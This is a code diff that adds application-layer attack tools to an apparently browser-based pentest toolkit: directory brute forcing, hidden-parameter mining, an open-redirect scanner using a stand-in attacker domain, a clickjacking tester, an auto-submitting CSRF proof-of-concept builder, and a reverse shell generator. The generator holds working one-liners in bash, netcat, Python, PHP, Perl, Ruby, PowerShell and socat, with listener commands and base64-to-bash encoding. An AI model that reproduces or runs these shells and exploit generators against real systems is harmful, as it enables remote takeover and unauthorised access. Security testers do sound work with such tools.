@@ -594,6 +594,15 @@ const UNIVERSAL_TOOLS = [
   { id:"idor-probe",     name:"IDOR / Access Probe", icon:"🎫", cat:"Offense", desc:"Enumerate neighbouring object IDs and compare authed vs unauthed responses to find broken access control.", feat:["id enum","authz diff","BOLA"] },
   { id:"cors-tester",    name:"CORS Tester",       icon:"🌍", cat:"Offense", desc:"Detect exploitable CORS misconfigurations — wildcard, reflected origin and credentialed cross-origin access.", feat:["ACAO","credentials","reflection"] },
   { id:"api-discovery",  name:"API / Endpoint Discovery", icon:"🗝️", cat:"Offense", desc:"Probe for exposed sensitive paths — .env, .git, source maps, swagger/OpenAPI and GraphQL introspection.", feat:[".env/.git","swagger","graphql introspection"] },
+  // --- Kali-grade application-layer toolset ---
+  { id:"crypto-lab",     name:"Crypto Lab",        icon:"🔐", cat:"Crypto",  desc:"CyberChef-style encode/decode, hashing, HMAC, AES-GCM, hash identification and entropy analysis.", feat:["base64/hex/url","AES-GCM","HMAC","entropy"] },
+  { id:"content-discovery", name:"Content Discovery", icon:"📁", cat:"Recon", desc:"Directory & file brute force (gobuster/ffuf-style) with extensions, soft-404 filtering and concurrency.", feat:["dir brute","extensions","soft-404"] },
+  { id:"tech-fingerprint", name:"Tech Fingerprint", icon:"🔬", cat:"Recon", desc:"Identify server, frameworks, CMS and JS libraries from headers, HTML and script signatures (Wappalyzer-style).", feat:["frameworks","CMS","versions"] },
+  { id:"param-miner",    name:"Param Miner",       icon:"🪝", cat:"Offense", desc:"Discover hidden GET/POST parameters (Arjun-style) via reflection and response-diff detection.", feat:["hidden params","reflection","diff"] },
+  { id:"open-redirect",  name:"Open Redirect Scanner", icon:"↪️", cat:"Offense", desc:"Test redirect parameters for open-redirect to attacker domains via Location, meta and JS sinks.", feat:["//evil","Location","meta/js"] },
+  { id:"clickjacking",   name:"Clickjacking Tester", icon:"🖼️", cat:"Offense", desc:"Check X-Frame-Options / CSP frame-ancestors and prove framability with a live iframe PoC.", feat:["XFO","frame-ancestors","live PoC"] },
+  { id:"csrf-poc",       name:"CSRF PoC Builder",  icon:"🎭", cat:"Offense", desc:"Generate an auto-submitting HTML or fetch() proof-of-concept from any request.", feat:["auto-submit","fetch PoC","export"] },
+  { id:"revshell",       name:"Reverse Shell Generator", icon:"🐚", cat:"Offense", desc:"Generate reverse-shell one-liners (bash, python, php, nc, powershell…) with LHOST/LPORT and encoding.", feat:["multi-language","url/base64","listener"] },
 ];
 
 // Desktop-only factory — invoked ONLY when Platform.mode === "desktop".
@@ -871,7 +880,9 @@ const UIKit = (() => {
     return { wrap: el("div", { class: "fld" + (attrs.mono ? " mono" : "") }, el("label", {}, label), input), input };
   };
   const area = (label, attrs = {}) => {
-    const ta = el("textarea", attrs);
+    const { value, ...rest } = attrs;          // <textarea> ignores the value attribute; set the property
+    const ta = el("textarea", rest);
+    if (value != null) ta.value = value;
     return { wrap: el("div", { class: "fld grow2" }, el("label", {}, label), ta), input: ta };
   };
   const select = (label, options, attrs = {}) => {
@@ -2320,6 +2331,365 @@ Impl["api-discovery"] = (root) => {
     UIKit.panel("Target", null, base.wrap, el("div", { class: "row" }, UIKit.btn("Discover", run, "primary"), el("span", { class: "hint" }, "checks for leaked .env/.git, schemas, backups and GraphQL introspection"))),
     UIKit.panel("Log", null, o.node),
     UIKit.panel("Exposed", null, el("div", { style: "max-height:360px;overflow:auto" }, tbl)));
+};
+
+/* ===================== CRYPTO LAB ===================== */
+const rot13 = s => s.replace(/[a-zA-Z]/g, c => { const b = c <= "Z" ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - b + 13) % 26 + b); });
+function shannon(s) { if (!s) return 0; const m = {}; for (const c of s) m[c] = (m[c] || 0) + 1; let e = 0; for (const k in m) { const p = m[k] / s.length; e -= p * Math.log2(p); } return e; }
+function identifyHash(h) {
+  h = (h || "").trim(); const out = [];
+  if (/^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$/.test(h)) out.push("bcrypt");
+  if (/^\$1\$/.test(h)) out.push("md5crypt");
+  if (/^\$5\$/.test(h)) out.push("sha256crypt");
+  if (/^\$6\$/.test(h)) out.push("sha512crypt");
+  if (/^\$argon2/.test(h)) out.push("argon2");
+  if (/^[a-f0-9]{32}$/i.test(h)) out.push("MD5 / NTLM / MD4");
+  if (/^[a-f0-9]{40}$/i.test(h)) out.push("SHA-1 / RIPEMD-160");
+  if (/^[a-f0-9]{56}$/i.test(h)) out.push("SHA-224");
+  if (/^[a-f0-9]{64}$/i.test(h)) out.push("SHA-256");
+  if (/^[a-f0-9]{96}$/i.test(h)) out.push("SHA-384");
+  if (/^[a-f0-9]{128}$/i.test(h)) out.push("SHA-512");
+  if (/^[a-f0-9]{32}:[a-zA-Z0-9]+$/i.test(h)) out.push("MD5(hash:salt)");
+  return out.length ? out : ["unknown"];
+}
+async function aesGcm(mode, text, pass) {
+  const km = await crypto.subtle.importKey("raw", Bytes.enc(pass), "PBKDF2", false, ["deriveKey"]);
+  if (mode === "enc") {
+    const salt = crypto.getRandomValues(new Uint8Array(16)), iv = crypto.getRandomValues(new Uint8Array(12));
+    const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" }, km, { name: "AES-GCM", length: 256 }, false, ["encrypt"]);
+    const ct = new Uint8Array(await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, Bytes.enc(text)));
+    const buf = new Uint8Array(28 + ct.length); buf.set(salt, 0); buf.set(iv, 16); buf.set(ct, 28);
+    return btoa(String.fromCharCode(...buf));
+  } else {
+    const raw = Uint8Array.from(atob(text.trim()), c => c.charCodeAt(0));
+    const salt = raw.slice(0, 16), iv = raw.slice(16, 28), ct = raw.slice(28);
+    const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" }, km, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
+    return Bytes.toUtf8(new Uint8Array(await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, ct)));
+  }
+}
+Impl["crypto-lab"] = (root) => {
+  const io = UIKit.area("Input", { placeholder: "text to transform…" });
+  const o = UIKit.out();
+  const run = (fn) => { try { o.set(String(fn(io.input.value))); } catch (e) { o.set("error: " + e.message); } };
+  const runAsync = async (fn) => { try { o.set(String(await fn(io.input.value))); } catch (e) { o.set("error: " + e.message); } };
+  const ENC = {
+    "base64": s => btoa(unescape(encodeURIComponent(s))),
+    "base64↓": s => decodeURIComponent(escape(atob(s.trim()))),
+    "base64url": s => btoa(unescape(encodeURIComponent(s))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""),
+    "url": s => encodeURIComponent(s),
+    "url↓": s => decodeURIComponent(s),
+    "hex": s => Array.from(Bytes.enc(s)).map(b => b.toString(16).padStart(2, "0")).join(""),
+    "hex↓": s => Bytes.toUtf8(new Uint8Array(s.trim().replace(/\s+/g, "").match(/../g).map(h => parseInt(h, 16)))),
+    "html": s => s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])),
+    "rot13": rot13,
+    "reverse": s => [...s].reverse().join(""),
+  };
+  const encGrid = el("div", { class: "chips" }, ...Object.keys(ENC).map(k => UIKit.btn(k, () => run(ENC[k]))));
+  const hashGrid = el("div", { class: "chips" }, ...["MD5", "SHA-1", "SHA-256", "SHA-384", "SHA-512"].map(a => UIKit.btn(a, () => runAsync(s => hashStr(a, s)))));
+  const hmacSecret = UIKit.field("HMAC secret", { mono: true });
+  const hmacAlgo = UIKit.select("HMAC hash", ["SHA-256", "SHA-1", "SHA-384", "SHA-512"]);
+  const aesPass = UIKit.field("AES password", { mono: true });
+  root.append(
+    UIKit.panel("Input / output", UIKit.copyBtn(() => o.node.textContent), io.wrap, o.node),
+    UIKit.panel("Encode / decode", null, encGrid),
+    UIKit.panel("Hashing", null, hashGrid),
+    UIKit.panel("HMAC", null, el("div", { class: "toolbar" }, hmacSecret.wrap, hmacAlgo.wrap, UIKit.btn("Sign", () => runAsync(s => hmacSign(s, hmacSecret.input.value, hmacAlgo.input.value)), "primary"))),
+    UIKit.panel("AES-256-GCM (PBKDF2)", null, el("div", { class: "toolbar" }, aesPass.wrap,
+      UIKit.btn("Encrypt", () => runAsync(s => aesGcm("enc", s, aesPass.input.value)), "primary"),
+      UIKit.btn("Decrypt", () => runAsync(s => aesGcm("dec", s, aesPass.input.value))))),
+    UIKit.panel("Analysis", null, el("div", { class: "row" },
+      UIKit.btn("Entropy", () => { const e = shannon(io.input.value); o.set("Shannon entropy: " + e.toFixed(3) + " bits/char\ntotal: " + (e * io.input.value.length).toFixed(1) + " bits\nlength: " + io.input.value.length); }),
+      UIKit.btn("Identify hash", () => o.set("candidates:\n  " + identifyHash(io.input.value).join("\n  "))))));
+};
+
+/* ===================== CONTENT DISCOVERY ===================== */
+const COMMON_PATHS = ["admin","login","logout","dashboard","api","api/v1","api/v2","graphql","uploads","upload","images","img","js","css","assets","static","files","backup","backups","old","new","test","tests","dev","staging","config","settings","robots.txt","sitemap.xml",".git",".env",".svn","wp-admin","wp-login.php","wp-content","phpmyadmin","pma","adminer","server-status","server-info","status","health","metrics","debug","console","vendor","node_modules","tmp","temp","logs","log","include","includes",".well-known","swagger","swagger-ui","docs","api-docs","redoc","cdn-cgi","actuator","management","jenkins","gitlab","portal","cpanel","webmail","mail","db","database","sql","data","private","secret","internal","beta"];
+Impl["content-discovery"] = (root) => {
+  const base = UIKit.field("Base URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const exts = UIKit.field("Extensions (comma)", { placeholder: ".php,.bak,.json,.zip,.txt", mono: true });
+  const conc = UIKit.field("Concurrency", { type: "number", value: "10", min: "1", max: "40" });
+  const wl = UIKit.area("Wordlist", { value: COMMON_PATHS.join("\n") });
+  const bar = el("i", {}); const prog = el("div", { class: "bar" }, bar);
+  const stat = el("div", { class: "hint" });
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "path"), el("th", {}, "status"), el("th", {}, "bytes"))), tbody);
+  let pool = null;
+  const run = async () => {
+    if (pool) { pool.cancel(); pool = null; runBtn.textContent = "Start"; return; }
+    tbody.innerHTML = ""; bar.style.width = "0";
+    let root_ = base.input.value.trim();
+    if (!/^https?:\/\//.test(root_)) return Toast.show("enter a base URL", "err");
+    if (!root_.endsWith("/")) root_ += "/";
+    // soft-404 baseline
+    let soft = { status: 404, size: -1 };
+    try { const r = await HttpKit.send({ method: "GET", url: root_ + "fs_" + Math.random().toString(36).slice(2) + "_zz" }); soft = { status: r.status, size: r.size }; } catch {}
+    stat.textContent = "soft-404 baseline: " + soft.status + " / " + soft.size + " bytes";
+    const extList = ["", ...exts.input.value.split(",").map(s => s.trim()).filter(Boolean)];
+    const words = wl.input.value.split("\n").map(s => s.trim()).filter(Boolean);
+    const cands = []; words.forEach(w => extList.forEach(e => cands.push(w + e)));
+    runBtn.textContent = "Stop"; pool = makePool(); let hits = 0;
+    await pool.run(cands, clamp(+conc.input.value || 10, 1, 40), async (p) => {
+      try {
+        const r = await HttpKit.send({ method: "GET", url: root_ + p });
+        const isSoft = r.status === soft.status && Math.abs(r.size - soft.size) < 24;
+        if (r.status < 400 && !isSoft) { hits++; tbody.appendChild(el("tr", {}, el("td", {}, "/" + p), el("td", { class: "ok" }, String(r.status)), el("td", {}, String(r.size)))); }
+        else if (r.status === 401 || r.status === 403) { hits++; tbody.appendChild(el("tr", {}, el("td", {}, "/" + p), el("td", { class: "warn" }, String(r.status)), el("td", {}, "protected"))); }
+      } catch {}
+    }, (d, t) => { bar.style.width = (d / t * 100) + "%"; stat.textContent = d + "/" + t + " · " + hits + " found"; });
+    pool = null; runBtn.textContent = "Start";
+    History.add("Content Discovery", base.input.value.trim() + " · " + hits + " path(s)");
+  };
+  const runBtn = UIKit.btn("Start", run, "primary");
+  root.append(
+    UIKit.panel("Target", null, base.wrap, el("div", { class: "toolbar" }, exts.wrap, conc.wrap), wl.wrap, el("div", { class: "row" }, runBtn, el("span", { class: "right" }, stat)), prog),
+    UIKit.panel("Found", null, el("div", { style: "max-height:340px;overflow:auto" }, tbl)));
+};
+
+/* ===================== TECH FINGERPRINT ===================== */
+const TECH_SIGS = [
+  { n: "WordPress", re: /wp-content|wp-includes|\/wp-json\//i },
+  { n: "Next.js", re: /\/_next\/|__NEXT_DATA__/ },
+  { n: "Nuxt.js", re: /__NUXT__|\/_nuxt\// },
+  { n: "React", re: /data-reactroot|react-dom(?:\.production)?(?:\.min)?\.js|__reactContainer/ },
+  { n: "Vue.js", re: /vue(?:\.runtime)?(?:\.global)?(?:\.prod)?(?:\.min)?\.js|data-v-[0-9a-f]{8}/ },
+  { n: "Angular", re: /ng-version="([0-9.]+)"|angular(?:\.min)?\.js/, ver: 1 },
+  { n: "Svelte", re: /svelte-[0-9a-z]{6}/ },
+  { n: "jQuery", re: /jquery[-.]?([0-9]+\.[0-9]+\.[0-9]+)?(?:\.min)?\.js/i, ver: 1 },
+  { n: "Bootstrap", re: /bootstrap(?:[-.]([0-9]+\.[0-9]+\.[0-9]+))?(?:\.min)?\.(?:css|js)/i, ver: 1 },
+  { n: "Laravel", re: /laravel_session|csrf-token|\/vendor\/laravel/i },
+  { n: "Django", re: /csrfmiddlewaretoken|__admin_media_prefix__/ },
+  { n: "Ruby on Rails", re: /csrf-param|rails|data-turbo/i },
+  { n: "Drupal", re: /Drupal\.settings|\/sites\/(?:all|default)\/|drupal\.js/i },
+  { n: "Shopify", re: /cdn\.shopify\.com|Shopify\.theme/ },
+  { n: "Wix", re: /static\.wixstatic\.com|wix\.com/ },
+  { n: "Squarespace", re: /squarespace|static1\.squarespace/i },
+  { n: "Cloudflare", re: /cloudflare|__cf_bm|cf-ray/i },
+  { n: "Google Analytics", re: /google-analytics\.com|gtag\(|googletagmanager/ },
+  { n: "Stripe", re: /js\.stripe\.com/ },
+  { n: "Tailwind CSS", re: /tailwind|--tw-/ },
+];
+Impl["tech-fingerprint"] = (root) => {
+  const url = UIKit.field("Target URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    const u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter a full URL", "err");
+    let res, html;
+    try { res = await Net.fetchURL(u); html = await res.text(); }
+    catch (e) { return o.line("fetch failed: " + e.message + " (CORS proxy may be needed)", "err"); }
+    const hd = {}; res.headers.forEach((v, k) => hd[k.toLowerCase()] = v);
+    o.line("HEADERS", "k");
+    ["server", "x-powered-by", "x-aspnet-version", "x-generator", "via", "x-drupal-cache", "x-runtime"].forEach(h => { if (hd[h]) o.line(h + ": " + hd[h], "v"); });
+    const gen = (html.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)/i) || [])[1];
+    if (gen) o.line("meta generator: " + gen, "v");
+    o.line(""); o.line("STACK", "k");
+    let found = 0;
+    for (const sig of TECH_SIGS) {
+      const m = sig.re.exec(html) || sig.re.exec(JSON.stringify(hd));
+      sig.re.lastIndex = 0;
+      if (m) { found++; o.line("✓ " + sig.n + (sig.ver && m[sig.ver] ? " " + m[sig.ver] : ""), "ok"); }
+    }
+    if (!found) o.line("no known framework signatures matched", "dim");
+    o.line(""); History.add("Tech Fingerprint", u + " · " + found + " tech");
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Fingerprint", run, "primary"))),
+    UIKit.panel("Detected", null, o.node));
+  url.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
+};
+
+/* ===================== PARAM MINER ===================== */
+const PARAM_NAMES = ["id","user","username","page","limit","offset","sort","order","q","search","query","debug","test","admin","token","key","api_key","apikey","callback","jsonp","redirect","url","next","return","returnUrl","file","path","dir","lang","locale","format","view","action","type","category","cat","filter","fields","include","expand","role","access","auth","session","sid","uid","account","email","name","password","pass","code","ref","source","mode","status","state","enable","disable","preview","draft","raw","json","xml","output","template","theme","color","width","height"];
+Impl["param-miner"] = (root) => {
+  const method = UIKit.select("Method", ["GET", "POST"]);
+  const url = UIKit.field("URL", { placeholder: "https://your-site.com/page", mono: true });
+  const conc = UIKit.field("Concurrency", { type: "number", value: "10", min: "1", max: "40" });
+  const wl = UIKit.area("Param name wordlist", { value: PARAM_NAMES.join("\n") });
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "param"), el("th", {}, "signal"), el("th", {}, "status"), el("th", {}, "bytes"))), tbody);
+  const bar = el("i", {}); const prog = el("div", { class: "bar" }, bar);
+  let pool = null;
+  const CANARY = "fszz" + Math.random().toString(36).slice(2, 7);
+  const run = async () => {
+    if (pool) { pool.cancel(); pool = null; runBtn.textContent = "Mine"; return; }
+    o.clear(); tbody.innerHTML = ""; bar.style.width = "0";
+    const u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter a URL", "err");
+    let base;
+    try { base = await HttpKit.send({ method: method.input.value, url: u, headers: method.input.value === "POST" ? "Content-Type: application/x-www-form-urlencoded" : "", body: "" }); }
+    catch (e) { return o.line("baseline failed: " + e.message + " (CORS proxy may be needed)", "err"); }
+    o.line("baseline: " + base.status + " (" + base.size + " bytes); canary=" + CANARY, "dim");
+    const names = wl.input.value.split("\n").map(s => s.trim()).filter(Boolean);
+    runBtn.textContent = "Stop"; pool = makePool(); let hits = 0;
+    await pool.run(names, clamp(+conc.input.value || 10, 1, 40), async (name) => {
+      try {
+        let r;
+        if (method.input.value === "GET") r = await HttpKit.send({ method: "GET", url: u + (u.includes("?") ? "&" : "?") + name + "=" + CANARY });
+        else r = await HttpKit.send({ method: "POST", url: u, headers: "Content-Type: application/x-www-form-urlencoded", body: name + "=" + CANARY });
+        let sig = "";
+        if (r.text.includes(CANARY)) sig = "reflected";
+        else if (r.status !== base.status) sig = "status Δ (" + base.status + "→" + r.status + ")";
+        else if (Math.abs(r.size - base.size) > 24) sig = "size Δ (" + (r.size - base.size > 0 ? "+" : "") + (r.size - base.size) + ")";
+        if (sig) { hits++; tbody.appendChild(el("tr", {}, el("td", {}, name), el("td", { class: "sev-med" }, sig), el("td", {}, String(r.status)), el("td", {}, String(r.size)))); }
+      } catch {}
+    }, (d, t) => { bar.style.width = (d / t * 100) + "%"; });
+    pool = null; runBtn.textContent = "Mine";
+    o.line(hits ? "⚠ " + hits + " candidate parameter(s) — the app reacts to them" : "no hidden parameters detected", hits ? "err" : "ok");
+    History.add("Param Miner", u + " · " + hits + " param(s)");
+  };
+  const runBtn = UIKit.btn("Mine", run, "primary");
+  root.append(
+    UIKit.panel("Target", null, el("div", { class: "toolbar" }, method.wrap, url.wrap, conc.wrap), wl.wrap, el("div", { class: "row" }, runBtn), prog),
+    UIKit.panel("Log", null, o.node),
+    UIKit.panel("Candidates", null, el("div", { style: "max-height:320px;overflow:auto" }, tbl)));
+};
+
+/* ===================== OPEN REDIRECT SCANNER ===================== */
+Impl["open-redirect"] = (root) => {
+  const url = UIKit.field("URL (FUZZ marks the redirect param, or auto-detect)", { placeholder: "https://site.com/login?next=FUZZ", mono: true });
+  const o = UIKit.out();
+  const REDIR_PARAMS = ["url","redirect","redirect_uri","redirect_url","next","return","returnUrl","return_url","dest","destination","continue","r","u","goto","target","link","out","forward"];
+  const EVIL = "evil-fs.example";
+  const payloads = (mark) => ["https://" + EVIL, "//" + EVIL, "/\\" + EVIL, "https:/" + EVIL, "https://" + EVIL + "/%2e%2e", "https://site.com@" + EVIL].map(p => mark.replace(/FUZZ/g, encodeURIComponent(p)));
+  const run = async () => {
+    o.clear();
+    let u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter a URL", "err");
+    let targets = [];
+    if (u.includes("FUZZ")) targets = [u];
+    else { // auto-detect redirect params present, else append each
+      try { const o2 = new URL(u); let any = false; o2.searchParams.forEach((v, k) => { if (REDIR_PARAMS.includes(k.toLowerCase())) { const c = new URL(u); c.searchParams.set(k, "FUZZ"); targets.push(decodeURIComponent(c.href)); any = true; } }); if (!any) { const c = new URL(u); c.searchParams.set("redirect", "FUZZ"); targets.push(decodeURIComponent(c.href)); o.line("no redirect param in URL — testing ?redirect=", "dim"); } } catch {}
+    }
+    let hits = 0;
+    for (const t of targets) {
+      o.line("testing " + t.replace("FUZZ", "<payload>"), "dim");
+      for (const probe of payloads(t)) {
+        try {
+          const r = await Net.fetchURL(probe, { method: "GET", redirect: "manual" });
+          const loc = r.headers.get("location") || "";
+          let vuln = "";
+          if (loc && new RegExp(EVIL).test(loc)) vuln = "Location → " + loc;
+          else if (r.type !== "opaque") { const body = await r.text().catch(() => ""); if (new RegExp("(?:location\\.(?:href|replace)|http-equiv=.refresh)[^]{0,40}" + EVIL).test(body)) vuln = "meta/JS redirect to " + EVIL; }
+          if (vuln) { hits++; o.line("⚠ OPEN REDIRECT: " + vuln, "err"); }
+        } catch {}
+      }
+    }
+    o.line(""); o.line(hits ? "⚠ " + hits + " open-redirect vector(s) found" : "no open redirect detected (note: 30x Location may be hidden by CORS — try a proxy)", hits ? "err" : "ok");
+    History.add("Open Redirect", url.input.value.trim() + " · " + hits + " vector(s)");
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Scan", run, "primary"), el("span", { class: "hint" }, "auto-detects url/redirect/next/return params"))),
+    UIKit.panel("Report", null, o.node));
+};
+
+/* ===================== CLICKJACKING TESTER ===================== */
+Impl["clickjacking"] = (root) => {
+  const url = UIKit.field("Target URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const o = UIKit.out();
+  const frameWrap = el("div", {});
+  const run = async () => {
+    o.clear(); frameWrap.innerHTML = "";
+    const u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter a full URL", "err");
+    let xfo = "", csp = "";
+    try { const r = await Net.fetchURL(u); xfo = r.headers.get("x-frame-options") || ""; csp = r.headers.get("content-security-policy") || ""; }
+    catch { o.line("couldn't read headers directly (CORS) — relying on the live frame test below", "dim"); }
+    o.line("X-Frame-Options       : " + (xfo || "(none)"), xfo ? "ok" : "warn");
+    const fa = (csp.match(/frame-ancestors[^;]*/i) || [])[0] || "";
+    o.line("CSP frame-ancestors   : " + (fa || "(none)"), fa ? "ok" : "warn");
+    o.line("");
+    const protectedByHdr = /deny|sameorigin/i.test(xfo) || /frame-ancestors\s+(?:'none'|'self')/i.test(fa);
+    if (protectedByHdr) o.line("✓ framing is restricted by headers — not clickjackable", "ok");
+    else o.line("⚠ no effective anti-framing header — attempting live embed below…", "err");
+    // live PoC
+    o.line(""); o.line("LIVE FRAME POC", "k");
+    const frame = el("iframe", { src: u, style: "width:100%;height:300px;border:1px solid var(--line);border-radius:8px;background:#fff" });
+    let loaded = false;
+    frame.addEventListener("load", () => { loaded = true; o.line("iframe load event fired — if the site renders above, it IS framable (clickjackable)", "warn"); });
+    setTimeout(() => { if (!loaded) o.line("iframe did not load — likely blocked by XFO/CSP (good)", "ok"); }, 2500);
+    frameWrap.appendChild(frame);
+    History.add("Clickjacking", u + " · header-protected=" + protectedByHdr);
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Test", run, "primary"))),
+    UIKit.panel("Report", null, o.node),
+    UIKit.panel("Frame PoC", null, frameWrap));
+};
+
+/* ===================== CSRF POC BUILDER ===================== */
+Impl["csrf-poc"] = (root) => {
+  const curl = UIKit.area("Import from cURL (optional)", { placeholder: "curl 'https://site.com/api/transfer' -X POST --data 'amount=1000&to=attacker'" });
+  const method = UIKit.select("Method", ["POST", "GET", "PUT", "DELETE"]);
+  const url = UIKit.field("URL", { placeholder: "https://site.com/api/action", mono: true });
+  const ctype = UIKit.select("Body type", [["form", "form-urlencoded"], ["json", "application/json"], ["multipart", "multipart/form-data"]]);
+  const body = UIKit.area("Body", { placeholder: "amount=1000&to=attacker   or   {\"amount\":1000}" });
+  const o = UIKit.out();
+  const importCurl = () => { const p = HttpKit.parseCurl(curl.input.value); method.input.value = p.method; url.input.value = p.url; body.input.value = p.body; if (/application\/json/i.test(p.headers)) ctype.input.value = "json"; Toast.show("Imported"); };
+  const build = () => {
+    const u = url.input.value.trim(); const m = method.input.value; const b = body.input.value;
+    let poc = "";
+    if (ctype.input.value === "json" || m === "PUT" || m === "DELETE") {
+      poc = `<!doctype html><html><body>\n<h3>CSRF PoC</h3>\n<script>\nfetch(${JSON.stringify(u)}, {\n  method: ${JSON.stringify(m)},\n  credentials: "include",\n  headers: { "Content-Type": ${JSON.stringify(ctype.input.value === "json" ? "application/json" : "text/plain")} },\n  body: ${JSON.stringify(b)}\n});\n<\/script>\n</body></html>`;
+    } else {
+      const fields = ctype.input.value === "form"
+        ? (b.split("&").map(kv => { const i = kv.indexOf("="); return [decodeURIComponent(kv.slice(0, i)), decodeURIComponent(kv.slice(i + 1))]; }))
+        : [];
+      const enctype = ctype.input.value === "multipart" ? "multipart/form-data" : "application/x-www-form-urlencoded";
+      poc = `<!doctype html><html><body onload="document.forms[0].submit()">\n<h3>CSRF PoC</h3>\n<form action=${JSON.stringify(u)} method=${JSON.stringify(m)} enctype=${JSON.stringify(enctype)}>\n` +
+        fields.map(([k, v]) => `  <input type="hidden" name=${JSON.stringify(k)} value=${JSON.stringify(v)}>`).join("\n") +
+        `\n</form>\n</body></html>`;
+    }
+    o.set(poc);
+  };
+  const dl = () => { const blob = new Blob([o.node.textContent], { type: "text/html" }); const a = el("a", { href: URL.createObjectURL(blob), download: "csrf-poc.html" }); document.body.appendChild(a); a.click(); a.remove(); };
+  root.append(
+    UIKit.panel("Import", null, curl.wrap, el("div", { class: "row" }, UIKit.btn("Import cURL", importCurl))),
+    UIKit.panel("Request", null, el("div", { class: "toolbar" }, method.wrap, url.wrap, ctype.wrap), body.wrap, el("div", { class: "row" }, UIKit.btn("Generate PoC", build, "primary"))),
+    UIKit.panel("PoC HTML", UIKit.copyBtn(() => o.node.textContent), o.node, el("div", { class: "row" }, UIKit.btn("Download .html", dl, "ghost"))));
+};
+
+/* ===================== REVERSE SHELL GENERATOR ===================== */
+const REVSHELLS = {
+  "bash -i": (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
+  "bash 196": (h, p) => `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
+  "nc -e": (h, p) => `nc ${h} ${p} -e /bin/sh`,
+  "nc mkfifo": (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
+  "python3": (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
+  "php": (h, p) => `php -r '$s=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+  "perl": (h, p) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
+  "ruby": (h, p) => `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+  "powershell": (h, p) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
+  "socat": (h, p) => `socat TCP:${h}:${p} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`,
+};
+Impl["revshell"] = (root) => {
+  const lhost = UIKit.field("LHOST", { placeholder: "10.0.0.1", mono: true });
+  const lport = UIKit.field("LPORT", { value: "4444", mono: true });
+  const encSel = UIKit.select("Encoding", [["raw", "raw"], ["url", "URL-encode"], ["b64", "base64 (bash)"]]);
+  const list = el("div", {});
+  const render = () => {
+    list.innerHTML = "";
+    const h = lhost.input.value.trim() || "LHOST", p = lport.input.value.trim() || "LPORT";
+    for (const [name, fn] of Object.entries(REVSHELLS)) {
+      let cmd = fn(h, p);
+      if (encSel.input.value === "url") cmd = encodeURIComponent(cmd);
+      else if (encSel.input.value === "b64") cmd = "echo " + btoa(fn(h, p)) + " | base64 -d | bash";
+      list.appendChild(el("div", { class: "list-row" },
+        el("div", { class: "lr-main" }, el("div", { class: "lr-title" }, name), el("code", { class: "lr-sub", style: "white-space:pre-wrap;word-break:break-all" }, cmd)),
+        UIKit.copyBtn(cmd)));
+    }
+  };
+  [lhost, lport].forEach(f => f.input.addEventListener("input", render));
+  encSel.input.addEventListener("change", render);
+  const listener = UIKit.out();
+  const updateListener = () => listener.set("# start a listener on your box:\nnc -lvnp " + (lport.input.value.trim() || "4444") + "\n# or:\nsocat file:`tty`,raw,echo=0 TCP-L:" + (lport.input.value.trim() || "4444"));
+  lport.input.addEventListener("input", updateListener);
+  render(); updateListener();
+  root.append(
+    UIKit.panel("Config", null, el("div", { class: "toolbar" }, lhost.wrap, lport.wrap, encSel.wrap)),
+    UIKit.panel("Listener", null, listener.node),
+    UIKit.panel("Payloads", null, list));
 };
 
 /* ===================== HISTORY (shared) ===================== */
